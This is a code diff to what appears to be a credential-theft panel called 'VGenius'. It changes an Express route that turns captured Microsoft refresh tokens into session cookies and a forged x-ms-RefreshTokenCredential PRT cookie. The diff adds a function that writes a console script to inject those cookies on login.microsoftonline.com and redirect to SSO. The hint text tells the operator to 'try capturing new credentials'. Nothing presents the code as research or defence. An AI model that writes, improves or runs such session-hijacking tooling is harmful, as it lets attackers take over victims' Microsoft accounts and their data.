@@ -206,6 +206,7 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
     var accountType = token.account_type || 'unknown';
     var cookiesList = [];
     var cookies = null;
+    var exchangeError = null;
 
     // ALWAYS exchange refresh token first for fresh cookies (primary method)
     if (refreshToken) {
@@ -221,10 +222,12 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
           cookiesList = parseCookies(cookies, { tenant: tenant, accountType: accountType });
           console.log('[Tokens] Fresh cookies generated:', cookiesList.length);
         } else {
-          console.warn('[Tokens] Token exchange failed:', conversionResult.error);
+          exchangeError = conversionResult.error || 'Token exchange returned no cookies';
+          console.error('[Tokens] Token exchange failed:', exchangeError);
         }
       } catch (convertErr) {
-        console.error('[Tokens] Cookie conversion error:', convertErr.message);
+        exchangeError = convertErr.message || 'Unknown conversion error';
+        console.error('[Tokens] Cookie conversion error:', exchangeError);
       }
     }
 
@@ -235,8 +238,9 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
       cookiesList = parseCookies(cookies, { tenant: tenant, accountType: accountType });
     }
 
-    // Generate x-ms-RefreshTokenCredential PRT script
+    // Generate x-ms-RefreshTokenCredential PRT script (most reliable method)
     var prtScript = null;
+    var prtError = null;
     if (refreshToken) {
       try {
         const cookieConverter = require('../services/cookieconverter');
@@ -269,40 +273,49 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
           { tid: tid, uid: uid, scopes: 'openid profile email offline_access https://graph.microsoft.com/.default' }
         );
         if (prtCookieObj && prtCookieObj.value) {
-          prtScript = `document.cookie = "x-ms-RefreshTokenCredential=${prtCookieObj.value}; domain=${prtCookieObj.domain}; path=/; secure; samesite=none";\nsetTimeout(() => {\n  window.location.href = "https://login.microsoftonline.com/?auth=2";\n}, 3000);`;
+          prtScript = `document.cookie = "x-ms-RefreshTokenCredential=${prtCookieObj.value}; domain=${prtCookieObj.domain}; path=/; secure; samesite=none";\nsetTimeout(() => {\n  window.location.href = "https://login.microsoftonline.com/?auth=2";\n}, 2000);`;
+          console.log('[Tokens] PRT script generated successfully');
+        } else {
+          prtError = 'PRT cookie generation returned null value';
         }
       } catch (prtErr) {
-        console.error('[Tokens] PRT script generation error:', prtErr.message);
+        prtError = prtErr.message || 'PRT generation failed';
+        console.error('[Tokens] PRT script generation error:', prtError);
       }
     }
 
     if (cookiesList.length === 0 && !prtScript) {
-      return res.status(400).json({ 
-        error: 'No cookies available',
-        hint: accessToken 
-          ? 'Token detected but conversion failed. Try "Refresh" to renew the session first.' 
-          : 'No token data found for this entry.'
+      return res.status(400).json({
+        error: 'No cookies could be generated',
+        exchange_error: exchangeError || 'No refresh token available',
+        prt_error: prtError,
+        hint: 'The refresh token may be expired or revoked. Try capturing new credentials.'
       });
     }
 
+    // Generate simple direct injection script (works on login.microsoftonline.com)
+    var directScript = generateDirectInjectionScript(cookiesList, prtScript);
+
     var scripts = {};
-    scripts.console = cookiesList.length > 0 ? generatePopupScript(cookiesList) : prtScript || '';
+    scripts.console = directScript;
+    scripts.prt = prtScript;
     scripts.html = cookiesList.length > 0 ? generateStandaloneHtml(cookiesList) : '';
     scripts.python = cookiesList.length > 0 ? generatePythonScript(cookiesList) : '';
-    scripts.injector = cookiesList.length > 0 ? generateInjectorScript(cookiesList, token.client_id || config.AZURE_CLIENT_ID, tenant) : '';
 
     res.json({
-      script: prtScript || scripts.console,
+      script: directScript,
       prt_script: prtScript,
       scripts: scripts,
       cookie_count: cookiesList.length,
       cookies: cookiesList,
       generated_at: new Date().toISOString(),
-      fresh: cookiesList.length > 0
+      fresh: cookiesList.length > 0 && !storedCookies,
+      exchange_error: exchangeError,
+      used_fallback: cookiesList.length > 0 && !exchangeError ? false : !!storedCookies
     });
   } catch (err) {
     console.error('[Tokens] Cookie script error:', err);
-    res.status(500).json({ error: 'Failed to generate script' });
+    res.status(500).json({ error: 'Failed to generate script', details: err.message });
   }
 });
 
@@ -480,6 +493,40 @@ function generatePopupScript(cookies) {
   
   return output;
 }
+
+// Direct injection script - works on login.microsoftonline.com page
+// Sets cookies for current domain then redirects to trigger SSO
+function generateDirectInjectionScript(cookies, prtScript) {
+  if (!cookies || cookies.length === 0) {
+    return prtScript || '';
+  }
+
+  var output = '// VGenius Cookie Injection Script\n';
+  output += '// Run this on https://login.microsoftonline.com\n';
+  output += '(function() {\n';
+  output += '  var injected = 0;\n';
+  output += '  var cookies = ' + JSON.stringify(cookies) + ';\n';
+  output += '\n';
+  output += '  // Set all cookies for login.microsoftonline.com domain\n';
+  output += '  for (var i = 0; i < cookies.length; i++) {\n';
+  output += '    var c = cookies[i];\n';
+  output += '    try {\n';
+  output += '      document.cookie = c.name + "=" + encodeURIComponent(c.value) + "; domain=" + c.domain + "; path=/; Secure; SameSite=None";\n';
+  output += '      injected++;\n';
+  output += '    } catch(e) {}\n';
+  output += '  }\n';
+  output += '\n';
+  output += '  console.log("[VGenius] Injected " + injected + " cookies");\n';
+  output += '\n';
+  output += '  // Wait 1.5s then redirect to trigger SSO\n';
+  output += '  setTimeout(function() {\n';
+  output += '    window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
+  output += '  }, 1500);\n';
+  output += '})();\n';
+
+  return output;
+}
+
 // ─── Standalone HTML injector page ──────────────────────────────────
 function generateStandaloneHtml(cookies) {
   const cookieJson = JSON.stringify(cookies);
